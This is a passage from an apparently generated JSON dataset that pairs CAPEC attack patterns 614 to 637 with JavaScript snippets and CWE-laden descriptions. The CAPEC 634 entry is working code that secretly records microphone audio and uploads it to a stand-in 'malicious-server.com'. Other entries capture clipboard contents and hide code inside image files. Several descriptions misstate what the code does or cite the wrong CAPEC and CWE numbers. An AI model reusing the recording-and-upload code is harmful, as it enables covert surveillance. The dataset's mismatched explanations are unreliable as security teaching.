        "code_snippet": "const crypto = require('crypto');\n\n// Simulate a weak DES key\nconst desKey = '12345678'; // CWE-326: Inadequate Encryption Strength\n\n// Function to simulate sending an OTA update via SMS\nfunction sendOTAUpdate(phoneNumber, message) {\n  // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n  const cipher = crypto.createCipheriv('des-ecb', desKey, null);\n  let encryptedMessage = cipher.update(message, 'utf8', 'hex');\n  encryptedMessage += cipher.final('hex');\n  console.log(`Sending OTA update to ${phoneNumber}: ${encryptedMessage}`);\n}\n\n// Simulate an attacker sending a malicious OTA update\nconst maliciousMessage = 'malicious code';\nconst targetPhoneNumber = '+1234567890';\nsendOTAUpdate(targetPhoneNumber, maliciousMessage);",
        "description": "This JavaScript code snippet demonstrates a simplified version of the 'Rooting SIM Cards' attack described in the CAPEC. The code uses a weak DES key (CWE-326) to encrypt a message, simulating the use of a broken or risky cryptographic algorithm (CWE-327). The `sendOTAUpdate` function represents the process of sending an over-the-air (OTA) update via SMS, which in this case, contains a malicious message. The encrypted message is then logged to the console, simulating the transmission of a malicious OTA update to a target phone number. This example highlights the vulnerabilities associated with using weak encryption and the potential for abuse in OTA update mechanisms."
    },
    {
        "capec_id": "615",
        "capec_name": "Evil Twin Wi-Fi Attack",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  // CWE-319: Cleartext Transmission of Sensitive Information\n  const sensitiveData = 'username=admin&password=1234';\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end(sensitiveData);\n}).listen(8080, '0.0.0.0');\n\nconsole.log('Server running at http://0.0.0.0:8080/');",
        "description": "This JavaScript code snippet creates an HTTP server that listens on all network interfaces (0.0.0.0) on port 8080. When a request is received, it responds with sensitive information (username and password) in cleartext. This embodies the main idea of the 'Evil Twin Wi-Fi Attack' (CAPEC-94) by demonstrating how sensitive data can be intercepted when transmitted over an insecure channel. The code also highlights several related CWEs: CWE-319 (Cleartext Transmission of Sensitive Information) by sending sensitive data in cleartext, CWE-300 (Channel Accessible by Non-Endpoint) by not verifying the identity of the requester, CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints) by allowing any endpoint to connect, CWE-940 (Improper Verification of Source of a Communication Channel) by not verifying the source of the request, and CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel) by not ensuring the integrity of the transmitted message."
    },
    {
        "capec_id": "616",
        "capec_name": "Establish Rogue Location",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction loadConfig(configPath) {\n  const defaultPath = '/etc/app/config.json';\n  const resolvedPath = path.resolve(configPath || defaultPath);\n\n  if (!fs.existsSync(resolvedPath)) {\n    throw new Error('Configuration file not found');\n  }\n\n  const config = JSON.parse(fs.readFileSync(resolvedPath, 'utf8'));\n  return config;\n}\n\n// Usage example\ntry {\n  const config = loadConfig(process.argv[2]);\n  console.log('Config loaded:', config);\n} catch (error) {\n  console.error('Error loading config:', error.message);\n}",
        "description": "This JavaScript code snippet demonstrates a potential vulnerability related to the 'Establish Rogue Location' CAPEC. The function `loadConfig` attempts to load a configuration file from a specified path or a default path. The code does not properly verify the source of the configuration file, which can lead to CWE-940 (Improper Verification of Source of a Communication Channel). An attacker could place a malicious configuration file at a location that the application might resolve to, exploiting CWE-426 (Untrusted Search Path). This could result in the exposure of sensitive information (CWE-200) or the creation of an emergent resource (CWE-1229) that the attacker can manipulate. The code snippet highlights the importance of verifying the source and integrity of resources to prevent such attacks."
    },
    {
        "capec_id": "617",
        "capec_name": "Cellular Rogue Base Station",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  console.log('Client connected');\n  socket.on('data', (data) => {\n    console.log('Received:', data.toString());\n    // Improper verification of source\n    if (data.toString().includes('AUTH')) {\n      socket.write('AUTH_OK');\n    } else {\n      socket.write('INVALID');\n    }\n  });\n  socket.on('end', () => {\n    console.log('Client disconnected');\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server listening on port 8080');\n});\n\n// Simulate a rogue base station\nconst rogueClient = net.createConnection({ port: 8080 }, () => {\n  console.log('Connected to server');\n  rogueClient.write('AUTH'); // Improper verification allows this to succeed\n});\n\nrogueClient.on('data', (data) => {\n  console.log('Server says:', data.toString());\n  rogueClient.end();\n});\n\nrogueClient.on('end', () => {\n  console.log('Disconnected from server');\n});",
        "description": "This JavaScript code snippet demonstrates a simple TCP server that accepts connections and processes incoming data. The server does not properly verify the source of the communication channel, which is a key aspect of the 'Cellular Rogue Base Station' attack scenario. The server listens on port 8080 and responds to any data containing 'AUTH' with 'AUTH_OK', without verifying the authenticity of the source. A rogue client simulates an attacker by connecting to the server and sending an 'AUTH' message, which the server improperly accepts. This code embodies the vulnerabilities described in the related CWEs, such as improper verification of the source (CWE-940), channel accessible by non-endpoint (CWE-300), and improper restriction of communication channel to intended endpoints (CWE-923)."
    },
    {
        "capec_id": "618",
        "capec_name": "Cellular Broadcast Message Request",
        "code_snippet": "const sendBroadcastMessage = (phoneNumber, message) => {\n  // CWE-201: Insertion of Sensitive Information Into Sent Data\n  const sensitiveData = `Phone: ${phoneNumber}, Message: ${message}`;\n  // CWE-940: Improper Verification of Source of a Communication Channel\n  if (!verifySource(phoneNumber)) {\n    console.error('Source verification failed');\n    return;\n  }\n  // CWE-924: Improper Enforcement of Message Integrity During Transmission\n  const messageWithIntegrity = addIntegrityCheck(sensitiveData);\n  // CWE-300: Channel Accessible by Non-Endpoint\n  if (!secureChannel()) {\n    console.error('Channel is not secure');\n    return;\n  }\n  // CWE-927: Use of Implicit Intent for Sensitive Communication\n  const intent = new Intent('SEND_BROADCAST');\n  intent.putExtra('data', messageWithIntegrity);\n  sendIntent(intent);\n};\n\nconst verifySource = (phoneNumber) => {\n  // Dummy verification function\n  return phoneNumber.startsWith('+1');\n};\n\nconst addIntegrityCheck = (data) => {\n  // Dummy integrity check function\n  return `${data}|checksum`;\n};\n\nconst secureChannel = () => {\n  // Dummy secure channel check\n  return true;\n};\n\nconst sendIntent = (intent) => {\n  // Dummy function to send intent\n  console.log('Broadcast message sent:', intent);\n};",
        "description": "This JavaScript code snippet simulates the process of sending a broadcast message to a mobile device, embodying the main idea of the CAPEC 'Cellular Broadcast Message Request'. The code includes several CWE-related vulnerabilities: CWE-201 (insertion of sensitive information into sent data), CWE-940 (improper verification of the source of a communication channel), CWE-924 (improper enforcement of message integrity during transmission), CWE-300 (channel accessible by non-endpoint), and CWE-927 (use of implicit intent for sensitive communication). The function 'sendBroadcastMessage' takes a phone number and a message, verifies the source, adds an integrity check, ensures the channel is secure, and sends the message using an implicit intent. This represents how an attacker could exploit these weaknesses to send broadcast messages and potentially track the location of a target mobile device."
    },
    {
        "capec_id": "619",
        "capec_name": "Signal Strength Tracking",
        "code_snippet": "const sensitiveData = 'userLocation';\n\nfunction sendLocationData() {\n  const xhr = new XMLHttpRequest();\n  xhr.open('POST', 'http://example.com/track', true);\n  xhr.setRequestHeader('Content-Type', 'application/json');\n  xhr.send(JSON.stringify({ location: sensitiveData }));\n}\n\nfunction trackSignalStrength() {\n  // Simulate signal strength tracking\n  const signalStrength = Math.random() * 100;\n  if (signalStrength > 50) {\n    sendLocationData();\n  }\n}\n\n// Simulate tracking every 5 seconds\nsetInterval(trackSignalStrength, 5000);",
        "description": "This JavaScript code snippet simulates a scenario where a device tracks signal strength and sends sensitive location data to a remote server if the signal strength exceeds a certain threshold. The `sendLocationData` function transmits the user's location data without proper verification or encryption, embodying CWE-201 (Insertion of Sensitive Information Into Sent Data) and CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel). The `trackSignalStrength` function simulates the tracking of signal strength, representing the main idea of the CAPEC 'Signal Strength Tracking'. The code does not include mechanisms to prevent physical side channels (CWE-1300) or verify the source of the communication channel (CWE-940), making it vulnerable to attacks."
    },
    {
        "capec_id": "620",
        "capec_name": "Drop Encryption Level",
        "code_snippet": "const crypto = require('crypto');\n\nfunction encrypt(data, algorithm) {\n  const key = 'hardcodedkey123456'; // CWE-321: Use of Hard-coded Cryptographic Key\n  const iv = crypto.randomBytes(16);\n  const cipher = crypto.createCipheriv(algorithm, key, iv);\n  let encrypted = cipher.update(data, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return { iv: iv.toString('hex'), encryptedData: encrypted };\n}\n\nfunction negotiateAlgorithm(clientPref, serverPref) {\n  // CWE-757: Selection of Less-Secure Algorithm During Negotiation\n  const supportedAlgorithms = ['aes-256-cbc', 'aes-128-cbc'];\n  for (let alg of clientPref) {\n    if (serverPref.includes(alg) && supportedAlgorithms.includes(alg)) {\n      return alg;\n    }\n  }\n  return 'aes-128-cbc'; // Default to a less secure algorithm\n}\n\nconst clientAlgorithms = ['aes-128-cbc', 'aes-256-cbc'];\nconst serverAlgorithms = ['aes-128-cbc'];\nconst selectedAlgorithm = negotiateAlgorithm(clientAlgorithms, serverAlgorithms);\nconst sensitiveData = 'Sensitive Information';\nconst encryptedData = encrypt(sensitiveData, selectedAlgorithm);\nconsole.log('Encrypted Data:', encryptedData);",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker can force the encryption level to be lowered, making the encrypted data more vulnerable. The `negotiateAlgorithm` function simulates the negotiation process between a client and a server to select an encryption algorithm. Due to the server's limited support, the function defaults to a less secure algorithm (CWE-757). The `encrypt` function uses a hard-coded cryptographic key (CWE-321) to encrypt sensitive data. This combination of weaknesses illustrates the 'Drop Encryption Level' attack, where the encryption strength is reduced, making the data easier to compromise."
    },
    {
        "capec_id": "621",
        "capec_name": "Analysis of Packet Timing and Sizes",
        "code_snippet": "const http = require('http');\nconst sensitiveData = 'user_password=12345';\n\nconst options = {\n  hostname: 'example.com',\n  port: 80,\n  path: '/login',\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/x-www-form-urlencoded',\n    'Content-Length': Buffer.byteLength(sensitiveData)\n  }\n};\n\nconst req = http.request(options, (res) => {\n  res.on('data', (chunk) => {\n    console.log(`BODY: ${chunk}`);\n  });\n  res.on('end', () => {\n    console.log('No more data in response.');\n  });\n});\n\nreq.on('error', (e) => {\n  console.error(`Problem with request: ${e.message}`);\n});\n\n// Write data to request body\nreq.write(sensitiveData);\nreq.end();",
        "description": "This JavaScript code snippet demonstrates a potential vulnerability related to the CAPEC 'Analysis of Packet Timing and Sizes'. The code sends sensitive information (a user password) in cleartext over an HTTP POST request. This is related to CWE-319 (Cleartext Transmission of Sensitive Information) and CWE-201 (Insertion of Sensitive Information Into Sent Data). An attacker could intercept and log the encrypted transmission, analyzing metadata such as packet timing and sizes to infer sensitive information. The code also highlights CWE-208 (Observable Timing Discrepancy) as the timing of the request and response could reveal additional information to an attacker."
    },
    {
        "capec_id": "622",
        "capec_name": "Electromagnetic Side-Channel Attack",
        "code_snippet": "const crypto = require('crypto');\n\nfunction encryptData(data, key) {\n  const cipher = crypto.createCipher('aes-256-cbc', key);\n  let encrypted = cipher.update(data, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n}\n\nfunction sendData(data) {\n  const key = '12345678901234567890123456789012'; // Weak key\n  const encryptedData = encryptData(data, key);\n  console.log('Sending data:', encryptedData);\n}\n\nconst sensitiveData = 'Sensitive Information';\nsendData(sensitiveData);",
        "description": "This JavaScript code snippet demonstrates a scenario where sensitive information is encrypted using a weak cryptographic key and then transmitted. The `encryptData` function uses the 'aes-256-cbc' algorithm with a hardcoded key, which is a poor practice (CWE-327). The `sendData` function logs the encrypted data to the console, simulating data transmission. This setup is vulnerable to electromagnetic side-channel attacks (CAPEC-201) because the weak key and the lack of proper protection mechanisms (CWE-1300) make it easier for an attacker to derive the key by monitoring electromagnetic emissions. Additionally, the hardcoded key represents a channel accessible by non-endpoints (CWE-300), further compromising security."
    },
    {
        "capec_id": "623",
        "capec_name": "Compromising Emanations Attack",
        "code_snippet": "const sensitiveData = 'user_password';\n\nfunction sendData() {\n  // Simulate sending data over a network\n  console.log('Sending data: ' + sensitiveData);\n}\n\nfunction processButtonPress() {\n  // Simulate a button press that causes an acoustic emission\n  console.log('Button pressed');\n  sendData();\n}\n\n// Simulate a button press event\nprocessButtonPress();",
        "description": "This JavaScript code snippet demonstrates a scenario where sensitive information (user_password) is transmitted over a network when a button is pressed. The button press event generates an acoustic emission, which can be captured and analyzed by an attacker to infer the sensitive data being processed. This embodies the main idea of a Compromising Emanations Attack (CAPEC-201) by showing how physical side channels (acoustic emissions) can be exploited to compromise sensitive information. The code also touches on related CWEs, such as the insertion of sensitive information into sent data (CWE-201) and improper protection of physical side channels (CWE-1300)."
    },
    {
        "capec_id": "624",
        "capec_name": "Hardware Fault Injection",
        "code_snippet": "function performSensitiveOperation() {\n  // Simulate a cryptographic operation\n  let secretKey = 'superSecretKey';\n  let data = 'sensitiveData';\n  let encryptedData = encrypt(data, secretKey);\n  \n  // Simulate a hardware fault injection vulnerability\n  if (isVoltageGlitchDetected() || isClockGlitchDetected() || isEMFIDetected()) {\n    // Faulty behavior: skip critical security check\n    return encryptedData;\n  }\n  \n  // Normal operation\n  if (isValidOperation()) {\n    return encryptedData;\n  } else {\n    throw new Error('Operation failed due to invalid state');\n  }\n}\n\nfunction encrypt(data, key) {\n  // Simple encryption logic (for demonstration purposes)\n  return btoa(data + key);\n}\n\nfunction isVoltageGlitchDetected() {\n  // Placeholder for voltage glitch detection logic\n  return false;\n}\n\nfunction isClockGlitchDetected() {\n  // Placeholder for clock glitch detection logic\n  return false;\n}\n\nfunction isEMFIDetected() {\n  // Placeholder for EM fault injection detection logic\n  return false;\n}\n\nfunction isValidOperation() {\n  // Placeholder for normal operation validation\n  return true;\n}",
        "description": "This JavaScript code snippet simulates a cryptographic operation that is vulnerable to hardware fault injection attacks, such as voltage glitches, clock glitches, and electromagnetic fault injection (EM-FI). The `performSensitiveOperation` function encrypts sensitive data using a secret key. The code includes checks for hardware fault injection attacks (`isVoltageGlitchDetected`, `isClockGlitchDetected`, `isEMFIDetected`). If any of these faults are detected, the function skips a critical security check, representing a vulnerability where faulty behavior can be exploited to bypass security mechanisms. This embodies the main idea of CAPEC-1247, CAPEC-1319, and related CWEs, highlighting the importance of proper protection against hardware fault injections."
    },
    {
        "capec_id": "625",
        "capec_name": "Mobile Device Fault Injection",
        "code_snippet": "function performSensitiveOperation() {\n  // Simulate a cryptographic operation\n  let secretKey = 'superSecretKey';\n  let data = 'sensitiveData';\n  let encryptedData = encrypt(data, secretKey);\n  \n  // Simulate a fault injection vulnerability\n  if (Math.random() < 0.1) { // 10% chance of fault injection\n    console.log('Fault injection detected! Skipping critical operation.');\n    return null;\n  }\n  \n  return encryptedData;\n}\n\nfunction encrypt(data, key) {\n  // Simple encryption simulation (not secure)\n  return btoa(data + key);\n}\n\nconsole.log(performSensitiveOperation());",
        "description": "This JavaScript code snippet simulates a cryptographic operation that is vulnerable to fault injection attacks, as described in the CAPEC. The `performSensitiveOperation` function encrypts sensitive data using a secret key. However, there is a simulated 10% chance of a fault injection event occurring, which causes the function to skip the critical encryption operation and return null. This represents the vulnerability where an attacker can induce faults to bypass security mechanisms and potentially derive secret key information. The related CWEs provide context for the types of vulnerabilities that can be exploited in such attacks, such as improper protection against voltage and clock glitches, electromagnetic fault injection, and instruction skips."
    },
    {
        "capec_id": "626",
        "capec_name": "Smudge Attack",
        "code_snippet": "document.addEventListener('touchend', function(event) {\n  let touch = event.changedTouches[0];\n  let x = touch.pageX;\n  let y = touch.pageY;\n  console.log('Touch coordinates: (' + x + ', ' + y + ')');\n  // Simulate storing touch coordinates which could be used to infer patterns\n  localStorage.setItem('lastTouch', JSON.stringify({x: x, y: y}));\n});\n\n// Simulate a function that could be exploited to reveal touch patterns\nfunction revealPattern() {\n  let lastTouch = JSON.parse(localStorage.getItem('lastTouch'));\n  if (lastTouch) {\n    console.log('Last touch coordinates: (' + lastTouch.x + ', ' + lastTouch.y + ')');\n    // Potentially vulnerable code: revealing touch coordinates\n  }\n}\n\n// Call the function to demonstrate potential vulnerability\nrevealPattern();",
        "description": "This JavaScript code snippet demonstrates a simplified version of a smudge attack on a touchscreen device. The 'touchend' event listener captures the coordinates of the user's touch and stores them in localStorage. The 'revealPattern' function retrieves and logs these coordinates, simulating how an attacker might exploit this information to infer the user's touch pattern. This example highlights the vulnerability of improper protection of physical side channels (CWE-1300) and excessive attack surface (CWE-1125), as the touch coordinates are stored and exposed without sufficient security measures."
    },
    {
        "capec_id": "627",
        "capec_name": "Counterfeit GPS Signals",
        "code_snippet": "const gpsReceiver = { receiveSignal: (signal) => { if (!verifySource(signal.source)) { console.log('Warning: Unverified GPS signal source'); return; } if (!verifyIntegrity(signal)) { console.log('Warning: GPS signal integrity compromised'); return; } processSignal(signal); }, }; function verifySource(source) { // Simulate improper verification return source === 'trustedSource'; } function verifyIntegrity(signal) { // Simulate improper integrity check return signal.integrity === 'intact'; } function processSignal(signal) { // Simulate processing of GPS signal console.log(`Processing GPS signal: ${signal.data}`); } // Simulated spoofed GPS signal const spoofedSignal = { source: 'maliciousSource', integrity: 'compromised', data: 'Fake GPS Data' }; gpsReceiver.receiveSignal(spoofedSignal);",
        "description": "This JavaScript code snippet simulates a GPS receiver that processes incoming GPS signals. The `gpsReceiver` object has a `receiveSignal` method that attempts to verify the source and integrity of the incoming signal. The `verifySource` and `verifyIntegrity` functions are designed to simulate improper verification and integrity checks, respectively. If the source is not 'trustedSource' or the integrity is not 'intact', warnings are logged, and the signal is not processed. The `processSignal` function simulates the processing of the GPS signal. A spoofed GPS signal with a malicious source and compromised integrity is then passed to the `receiveSignal` method, demonstrating how an adversary could deceive the GPS receiver by broadcasting counterfeit signals. This code embodies the main idea of the CAPEC by illustrating how improper verification and integrity checks can lead to the acceptance of spoofed GPS signals."
    },
    {
        "capec_id": "628",
        "capec_name": "Carry-Off GPS Attack",
        "code_snippet": "const gpsReceiver = { currentLocation: { lat: 0, lon: 0 }, updateLocation: function(lat, lon) { this.currentLocation = { lat, lon }; } }; const spoofedSignal = { lat: 40.7128, lon: -74.0060 }; // Spoofed coordinates (e.g., New York City) function receiveGPSSignal(signal) { // CWE-940: Improper Verification of Source of a Communication Channel if (verifySignalSource(signal)) { gpsReceiver.updateLocation(signal.lat, signal.lon); } else { console.log('Warning: Unverified GPS signal source'); } } function verifySignalSource(signal) { // CWE-290: Authentication Bypass by Spoofing // Simplified verification logic (in reality, this should be more robust) return signal.source === 'trusted'; } // CWE-941: Incorrectly Specified Destination in a Communication Channel // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel receiveGPSSignal({ lat: spoofedSignal.lat, lon: spoofedSignal.lon, source: 'untrusted' }); console.log(gpsReceiver.currentLocation);",
        "description": "This JavaScript code snippet simulates a GPS receiver that updates its location based on incoming GPS signals. The 'receiveGPSSignal' function processes incoming signals and updates the receiver's location if the signal source is verified. The 'verifySignalSource' function is a simplified check to ensure the signal is from a trusted source. The code demonstrates vulnerabilities related to GPS spoofing attacks (CAPEC) and highlights weaknesses such as improper verification of the source (CWE-940), authentication bypass by spoofing (CWE-290), and potential issues with message integrity and destination specification (CWE-941, CWE-924). The spoofed signal in the example represents an adversary's attempt to mislead the GPS receiver by providing false coordinates."
    },
    {
        "capec_id": "629",
        "capec_name": "DEPRECATED: Unauthorized Use of Device Resources",
        "code_snippet": "const fs = require('fs');\n\nfunction readFile(filePath) {\n  if (!isAuthorized(filePath)) {\n    console.log('Unauthorized access attempt detected.');\n    return;\n  }\n\n  fs.readFile(filePath, 'utf8', (err, data) => {\n    if (err) {\n      console.error('Error reading file:', err);\n      return;\n    }\n    console.log('File content:', data);\n  });\n}\n\nfunction isAuthorized(filePath) {\n  // Simulate an incorrect authorization check\n  return filePath !== 'restricted.txt';\n}\n\n// Simulate user input\nconst userInput = 'CON';\nreadFile(userInput);",
        "description": "This JavaScript code snippet demonstrates a scenario where unauthorized use of device resources can occur due to improper handling of Windows device names and incorrect authorization checks. The `readFile` function attempts to read a file specified by `filePath`. It first checks if the file path is authorized using the `isAuthorized` function, which contains a flawed authorization logic. If the file path is 'restricted.txt', access is denied; otherwise, access is granted. However, the code does not handle special Windows device names like 'CON', leading to potential denial of service or information exposure. This snippet embodies the main idea of the deprecated CAPEC by showing how improper resource handling and authorization can lead to vulnerabilities."
    },
    {
        "capec_id": "630",
        "capec_name": "TypoSquatting",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/redirect', (req, res) => {\n  const target = req.query.url;\n  if (target) {\n    res.redirect(target);\n  } else {\n    res.send('No URL provided');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server that includes an endpoint '/redirect'. The endpoint takes a 'url' parameter from the query string and redirects the user to that URL. This code embodies the main idea of TypoSquatting by allowing an adversary to exploit user input to redirect to a potentially malicious site (CWE-601: URL Redirection to Untrusted Site). The lack of validation on the 'url' parameter can lead to phishing attacks, where users might be redirected to a typo-squatted domain. This example also touches on CWE-115 (Misinterpretation of Input) as the input URL is not validated or sanitized, making it easy for an attacker to exploit."
    },
    {
        "capec_id": "631",
        "capec_name": "SoundSquatting",
        "code_snippet": "const trustedDomain = 'trusted.com';\nconst userInputDomain = 'trvsted.com'; // SoundSquatting domain\n\nfunction redirectToDomain(domain) {\n  if (domain === trustedDomain) {\n    window.location.href = `https://${domain}`;\n  } else {\n    console.log('Untrusted domain detected!');\n  }\n}\n\n// Simulate user input\nredirectToDomain(userInputDomain);",
        "description": "This JavaScript code snippet demonstrates a potential SoundSquatting attack. The `trustedDomain` variable holds the legitimate domain name, while `userInputDomain` simulates a domain name that sounds similar but is spelled differently (a SoundSquatting domain). The `redirectToDomain` function checks if the provided domain matches the trusted domain and redirects the user if it does. If the domain does not match, it logs a message indicating an untrusted domain. This example highlights the risk of SoundSquatting attacks where users might be redirected to malicious sites due to similar-sounding domain names. The code also touches on CWE-601 (Open Redirect) by showing how user-controlled input can be used in a redirect, and CWE-290 (Authentication Bypass by Spoofing) by demonstrating how a spoofed domain could bypass simple checks."
    },
    {
        "capec_id": "632",
        "capec_name": "Homograph Attack via Homoglyphs",
        "code_snippet": "const trustedDomain = 'example.com';\nconst userInput = 'examp1e.com'; // Homoglyph attack: '1' instead of 'l'\n\nfunction isTrustedDomain(input) {\n  const regex = new RegExp(`^${trustedDomain.replace('.', '\\.')}$`, 'i');\n  return regex.test(input);\n}\n\nif (isTrustedDomain(userInput)) {\n  console.log('Access granted to trusted domain.');\n} else {\n  console.log('Access denied. Potential homograph attack detected.');\n}",
        "description": "This JavaScript code snippet demonstrates a potential vulnerability to a homograph attack via homoglyphs. The trusted domain is 'example.com', but the user input is 'examp1e.com', where the digit '1' is used instead of the letter 'l'. The function 'isTrustedDomain' uses a regular expression to check if the user input matches the trusted domain. However, this simplistic check does not account for visually similar characters (homoglyphs), making it vulnerable to homograph attacks. The code highlights the importance of properly distinguishing between visually similar characters to prevent such attacks. This example also touches on CWE-1007 (Insufficient Visual Distinction of Homoglyphs Presented to User) and CWE-777 (Regular Expression without Anchors) by showing how improper handling of user input can lead to security vulnerabilities."
    },
    {
        "capec_id": "633",
        "capec_name": "Token Impersonation",
        "code_snippet": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\n// Secret key for JWT\nconst secretKey = 'supersecretkey';\n\n// Middleware to authenticate token\nfunction authenticateToken(req, res, next) {\n  const token = req.headers['authorization'];\n  if (!token) return res.sendStatus(403);\n\n  jwt.verify(token, secretKey, (err, user) => {\n    if (err) return res.sendStatus(403);\n    req.user = user;\n    next();\n  });\n}\n\n// Route that generates a token for a user\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const user = { name: username };\n\n  // Generate a token with weak authentication\n  const token = jwt.sign(user, secretKey);\n  res.json({ token: token });\n});\n\n// Route that requires authentication\napp.get('/protected', authenticateToken, (req, res) => {\n  res.send('This is a protected route');\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a basic Express.js application that uses JSON Web Tokens (JWT) for authentication. The '/login' route generates a token for a user without proper authentication, representing CWE-287 (Improper Authentication) and CWE-1390 (Weak Authentication). The 'authenticateToken' middleware verifies the token but does not ensure the token's integrity or the user's identity, embodying CWE-1270 (Generation of Incorrect Security Tokens) and CWE-1259 (Improper Restriction of Security Token Assignment). This setup can lead to token impersonation attacks, where an adversary can exploit these weaknesses to impersonate another user and gain unauthorized access to protected routes, aligning with the main idea of the CAPEC."
    },
    {
        "capec_id": "634",
        "capec_name": "Probe Audio and Video Peripherals",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst { exec } = require('child_process');\n\n// CWE-267: Privilege Defined With Unsafe Actions\nexec('arecord -d 10 /tmp/audio_capture.wav', (err) => {\n  if (err) throw err;\n  console.log('Audio captured');\n\n  // CWE-319: Cleartext Transmission of Sensitive Information\n  const options = {\n    hostname: 'malicious-server.com',\n    port: 80,\n    path: '/upload',\n    method: 'POST',\n    headers: {\n      'Content-Type': 'audio/wav'\n    }\n  };\n\n  const req = http.request(options, (res) => {\n    res.on('data', (d) => {\n      process.stdout.write(d);\n    });\n  });\n\n  req.on('error', (e) => {\n    console.error(e);\n  });\n\n  // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n  const audioStream = fs.createReadStream('/tmp/audio_capture.wav');\n  audioStream.pipe(req);\n  audioStream.on('end', () => {\n    req.end();\n  });\n});",
        "description": "This JavaScript code snippet demonstrates a malicious script that captures audio from a system's microphone and transmits it to a remote server. The script uses Node.js to execute a shell command (`arecord`) to record audio for 10 seconds and save it to a temporary file. It then sends this audio file to a remote server over HTTP in cleartext, exposing sensitive information. This snippet embodies the CAPEC 'Probe Audio and Video Peripherals' by exploiting audio functionalities to capture sensitive information. It also highlights several CWEs: CWE-267 by executing a potentially unsafe action with elevated privileges, CWE-319 by transmitting sensitive data in cleartext, and CWE-497 by exposing sensitive system information to an unauthorized control sphere."
    },
    {
        "capec_id": "635",
        "capec_name": "Alternative Execution Due to Deceptive Filenames",
        "code_snippet": "const express = require('express');\nconst fileUpload = require('express-fileupload');\nconst path = require('path');\nconst app = express();\n\napp.use(fileUpload());\n\napp.post('/upload', (req, res) => {\n  if (!req.files || Object.keys(req.files).length === 0) {\n    return res.status(400).send('No files were uploaded.');\n  }\n\n  let uploadedFile = req.files.uploadedFile;\n  let uploadPath = path.join(__dirname, 'uploads', uploadedFile.name);\n\n  // Save the file to the server\n  uploadedFile.mv(uploadPath, (err) => {\n    if (err) return res.status(500).send(err);\n\n    // Check file extension\n    let fileExtension = path.extname(uploadedFile.name);\n    if (fileExtension !== '.txt') {\n      return res.status(400).send('Invalid file type. Only .txt files are allowed.');\n    }\n\n    res.send('File uploaded!');\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server started on http://localhost:3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework and the express-fileupload middleware to handle file uploads. The main idea of the CAPEC is represented by the potential vulnerability in handling file uploads based on file extensions. The code checks the file extension after saving the file to the server, which is a flawed approach. An attacker could upload a file with a deceptive filename, such as 'malicious.txt.exe', which could bypass the extension check and be executed as an executable file. This demonstrates CWE-646 (Reliance on File Name or Extension of Externally-Supplied File) and CWE-73 (External Control of File Name or Path). The code also does not properly neutralize special elements in filenames, which relates to CWE-162 (Improper Neutralization of Trailing Special Elements)."
    },
    {
        "capec_id": "636",
        "capec_name": "Hiding Malicious Data or Code within Files",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Function to hide malicious code in an image file's metadata\nfunction hideMaliciousCode(imagePath, maliciousCode) {\n  const imageBuffer = fs.readFileSync(imagePath);\n  const metadata = `<!-- ${maliciousCode} -->`;\n  const hiddenData = Buffer.concat([imageBuffer, Buffer.from(metadata)]);\n  fs.writeFileSync(imagePath, hiddenData);\n}\n\n// Example usage\nconst imagePath = path.join(__dirname, 'example.jpg');\nconst maliciousCode = 'console.log(\"Malicious code executed\");';\nhideMaliciousCode(imagePath, maliciousCode);",
        "description": "This JavaScript code snippet demonstrates how an attacker might hide malicious code within the metadata of an image file. The `hideMaliciousCode` function reads the image file into a buffer, appends a comment containing the malicious code to the buffer, and then writes the modified buffer back to the file. This embodies the CAPEC concept of hiding malicious data within files. The related CWEs are represented as follows: CWE-506 (Embedded Malicious Code) by embedding the malicious code in the image metadata, CWE-219 (Storage of File with Sensitive Data Under Web Root) by potentially placing the image in a web-accessible directory, CWE-313 (Cleartext Storage in a File or on Disk) by storing the malicious code in cleartext, CWE-318 (Cleartext Storage of Sensitive Information in Executable) by storing executable code in cleartext, and CWE-515 (Covert Storage Channel) by using the image file's metadata as a covert channel to store the malicious code."
    },
    {
        "capec_id": "637",
        "capec_name": "Collect Data from Clipboard",
        "code_snippet": "document.addEventListener('copy', function(event) {\n  var clipboardData = event.clipboardData || window.clipboardData;\n  var copiedText = clipboardData.getData('text');\n  // Log the copied text to the console (simulating exfiltration)\n  console.log('Copied text:', copiedText);\n  // Store the copied text in local storage (cleartext storage vulnerability)\n  localStorage.setItem('copiedText', copiedText);\n});",
        "description": "This JavaScript code snippet listens for the 'copy' event, which is triggered when a user copies text to the clipboard. When the event occurs, it retrieves the copied text from the clipboard and logs it to the console, simulating the exfiltration of sensitive information. Additionally, it stores the copied text in the browser's local storage in cleartext, demonstrating a cleartext storage vulnerability. This code embodies the main idea of CAPEC-Collect Data from Clipboard by showing how an adversary can exploit clipboard data to gather unauthorized information. The related CWEs are represented by the unsafe logging and storage of sensitive information."
    },
    {
        "capec_id": "638",
        "capec_name": "Altered Component Firmware",
